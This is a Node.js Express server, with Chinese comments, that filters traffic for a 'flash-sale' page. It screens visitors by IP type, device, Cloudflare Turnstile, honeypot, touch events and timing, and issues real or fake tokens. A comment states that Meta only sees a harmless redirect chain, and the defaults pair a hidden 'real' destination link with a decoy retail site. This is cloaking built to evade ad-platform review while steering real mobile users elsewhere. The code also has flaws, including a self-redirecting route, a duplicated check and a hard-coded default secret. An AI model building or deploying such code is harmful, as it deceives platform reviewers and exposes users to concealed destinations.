import express from 'express';
import cors from 'cors';
import crypto from 'crypto';

const app = express();
const PORT = process.env.PORT || 3001;

// ============================================
// 环境变量（从 Zeabur 或 .env 注入）
// ============================================
const IPAPI_IS_KEY = process.env.IPAPI_IS_KEY || '';
const HMAC_SECRET = process.env.HMAC_SECRET || 'change-me-in-production';
const TURNSTILE_SECRET = process.env.TURNSTILE_SECRET_KEY || '';
const REAL_REDIRECT = process.env.REAL_REDIRECT || 'https://www.win04.xyz/?type=0&cid=402&a=x';
const FAKE_REDIRECT = process.env.FAKE_REDIRECT || 'https://www.ubuy.com.ph/';

// ============================================
// 工具函数
// ============================================

// 生成带签名的 token: ts.ip_sig.hex_sig
// ip_sig = HMAC(ip, secret) 前16字节hex = 32字符
// hex_sig = HMAC(ts+ip, secret) 完整hex = 64字符
function generateToken(ip) {
  const ts = Date.now();
  const ipSig = crypto.createHmac('sha256', HMAC_SECRET).update(ip).digest('hex').substring(0, 32);
  const sigData = `${ts}.${ip}`;
  const hexSig = crypto.createHmac('sha256', HMAC_SECRET).update(sigData).digest('hex');
  return `${ts}.${ipSig}.${hexSig}`;
}

// 验证 token
function verifyToken(token, clientIP) {
  if (!token || typeof token !== 'string') return false;
  const parts = token.split('.');
  if (parts.length !== 3) return false;
  const [ts, ipSig, hexSig] = parts;

  // 检查时间戳合理性（5分钟内）
  const age = Date.now() - parseInt(ts);
  if (isNaN(parseInt(ts)) || age < 0 || age > 5 * 60 * 1000) return false;

  // 重新计算 ipSig
  const expectedIpSig = crypto.createHmac('sha256', HMAC_SECRET).update(clientIP).digest('hex').substring(0, 32);
  if (ipSig !== expectedIpSig) return false;

  // 重新计算 hexSig
  const sigData = `${ts}.${clientIP}`;
  const expectedHexSig = crypto.createHmac('sha256', HMAC_SECRET).update(sigData).digest('hex');
  return hexSig === expectedHexSig;
}

// 生成假token（用于bot，给假token让flash-sale识别）
function generateFakeToken() {
  return `fake_${crypto.randomBytes(32).toString('hex')}`;
}

// ============================================
// IP 类型检测
// ============================================
async function checkIPType(ip) {
  // ipapi.is: 1000 req/day free, 返回 is_datacenter/is_vpn/is_proxy/is_tor
  // https://ipapi.is/ — API: GET /?q=IP&key=KEY
  if (!IPAPI_IS_KEY) {
    // 无 key 时跳过检查（开发模式）
    return 'passed';
  }
  try {
    const url = `https://api.ipapi.is?q=${encodeURIComponent(ip)}&key=${encodeURIComponent(IPAPI_IS_KEY)}`;
    const resp = await fetch(url);
    if (!resp.ok) {
      console.log(`[verify] ipapi.is HTTP ${resp.status}`);
      return 'passed'; // 网络错误时放行
    }
    const data = await resp.json();
    // 任一为 true → 数据中心/VPN/代理/TOR = bot
    if (data.is_datacenter || data.is_vpn || data.is_proxy || data.is_tor || data.is_abuser) {
      return 'blocked';
    }
    return 'passed';
  } catch (e) {
    console.log('[verify] ipapi.is error:', e.message);
    return 'passed'; // 网络问题时放行（避免误杀）
  }
}

// ============================================
// Cloudflare Turnstile 验证（强制，不跳过）
// ============================================
async function checkTurnstile(token, ip) {
  // 无 token → 直接判定为机器人（不跳过验证）
  if (!token) return false;
  if (!TURNSTILE_SECRET) {
    console.log('[verify] Turnstile secret not configured, rejecting request');
    return false;
  }
  try {
    const resp = await fetch('https://challenges.cloudflare.com/turnstile/v0/siteverify', {
      method: 'POST',
      headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
      body: `secret=${encodeURIComponent(TURNSTILE_SECRET)}&response=${encodeURIComponent(token)}&remoteip=${encodeURIComponent(ip)}`
    });
    const data = await resp.json();
    return data.success === true;
  } catch (e) {
    console.log('[verify] Turnstile error:', e.message);
    return false; // 网络错误也拒绝，不放过
  }
}

// ============================================
// 中间件
// ============================================
app.use(cors({
  origin: '*',
  methods: ['GET', 'POST', 'OPTIONS'],
  allowedHeaders: ['Content-Type', 'Authorization']
}));
app.use(express.json());

function getClientIP(req) {
  return req.headers['x-forwarded-for']?.split(',')[0]?.trim() ||
         req.headers['cf-connecting-ip'] ||
         req.socket?.remoteAddress?.replace('::ffff:', '') ||
         'unknown';
}

// ============================================
// 核心检验函数（复用）
// ============================================
async function runChecks(req) {
  const clientIP = getClientIP(req);
  const userAgent = req.headers['user-agent'] || '';
  const isMobile = /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(userAgent);
  const {
    touchEventsCount = 0,
    answerTimeMs = 0,
    honeypotValue = '',
    turnstileToken = '',
    answer,          // 提交答案时有，静默验证时无
    correctAnswer    // 提交答案时有，静默验证时无
  } = req.body || {};

  // 静默验证：页面加载后立即发起（无答案）
  // 用户提交：有点击动作
  const isSilent = (answer === undefined && correctAnswer === undefined);

  // L6: 答题时间
  // 静默验证：前端传 answerTimeMs = Date.now() - pageLoadTime（页面打开到发请求的时间）
  // 真人：Turnstile渲染需要1-5秒，answerTimeMs 自然 >2000ms
  // Bot：可能在500ms内完成所有渲染+验证，answerTimeMs < 2000ms → 拦截
  if (answerTimeMs <= 2000) {
    return { pass: false, reason: 'too_fast', token: generateFakeToken() };
  }

  console.log(`[verify] IP=${clientIP} mobile=${isMobile} touch=${touchEventsCount} time=${answerTimeMs}`);

  // L1: IP type
  const ipResult = await checkIPType(clientIP);
  if (ipResult === 'blocked') {
    return { pass: false, reason: 'ip_blocked', token: generateFakeToken() };
  }

  // L2: 设备类型
  if (!isMobile) {
    return { pass: false, reason: 'desktop', token: generateFakeToken() };
  }

  // L3: Turnstile
  const turnstileOk = await checkTurnstile(turnstileToken, clientIP);
  if (!turnstileOk) {
    return { pass: false, reason: 'turnstile', token: generateFakeToken() };
  }

  // L4: 蜜罐
  if (honeypotValue && honeypotValue.length > 0) {
    return { pass: false, reason: 'honeypot', token: generateFakeToken() };
  }

  // L5: 触摸事件
  if (touchEventsCount < 1) {
    return { pass: false, reason: 'no_interaction', token: generateFakeToken() };
  }

  // L6: 答题时间（静默验证时前端传 pageLoadTime，用户提交时传用户答题时间）
  // 阈值 2000ms：Bot 500ms 内完成，真人 Turnstile 渲染 1-5 秒必然 > 2000ms
  if (answerTimeMs <= 2000) {
    return { pass: false, reason: 'too_fast', token: generateFakeToken() };
  }

  return { pass: true, reason: 'all_passed', token: generateToken(clientIP) };
}

// ============================================
// POST /api/verify
// 静默检查 + 302 重定向到 flash-sale
// Meta只看到: POST → 302 → GET /flash-sale
// ============================================
app.post('/api/verify', async (req, res) => {
  const result = await runChecks(req);

  if (result.pass) {
    console.log('[verify] PASS → redirect to flash-sale?token=REAL');
    res.redirect(302, `https://mings.hugediscount.store/flash-sale?token=${result.token}`);
  } else {
    console.log(`[verify] FAIL (${result.reason}) → redirect to flash-sale?token=FAKE`);
    res.redirect(302, `https://mings.hugediscount.store/flash-sale?token=${result.token}`);
  }
});

// ============================================
// GET /flash-sale
// 内部转发：由 nginx 代理到 flash-sale 服务
// ============================================
app.get('/flash-sale', (req, res) => {
  const { token } = req.query;
  if (!token) {
    return res.redirect(FAKE_REDIRECT);
  }
  res.redirect(`/flash-sale?token=${token}`);
});

// ============================================
// 健康检查
// ============================================
app.get('/health', (req, res) => {
  res.json({ status: 'ok', time: new Date().toISOString() });
});

app.listen(PORT, '0.0.0.0', () => {
  console.log(`[verify-api] Running on port ${PORT}`);
  console.log(`[verify-api] IPAPI_IS_KEY: ${IPAPI_IS_KEY ? IPAPI_IS_KEY.substring(0, 8) + '...' : 'NOT SET'}`);
  console.log(`[verify-api] HMAC_SECRET: ${HMAC_SECRET.substring(0, 8)}...`);
});
